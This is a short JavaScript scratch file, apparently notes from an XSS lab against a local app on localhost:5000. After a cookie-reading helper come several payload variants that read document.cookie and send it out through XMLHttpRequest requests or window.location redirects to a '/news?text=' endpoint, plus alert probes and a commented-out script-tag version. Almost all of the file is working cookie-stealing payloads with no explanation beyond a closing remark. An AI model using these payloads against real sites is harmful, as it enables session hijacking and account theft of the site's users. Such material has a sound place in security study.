function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

var cookie = getCookie('alice@alice.com')
print(cookie)

// <script> 
// var cookie = document.cookie; 
// document.write(cookie); 
// </script>

// // <script>window.location'http://localhost:5000/news?text='+document.cookie;</script>

var cookie=document.cookie; var xhr=new XMLHttpRequest();xhr.open('GET', 'http://localhost:5000/news?text='+cookie);

var cookie=document.cookie; alert(cookie);

var cookie=document.cookie; window.location.replace('http://localhost:5000/news?text=\''+cookie+'\'');

var cookie=document.cookie.substring(8); alert(document.cookie + '   ' + cookie);


var cookie=document.cookie.substring(8);
var xhr=new XMLHttpRequest();
xhr.open('GET','news?text='+cookie);
xhr.withCredentials = true; 
xhr.send();

// note: cookies are tagged to domain names instead of IP address.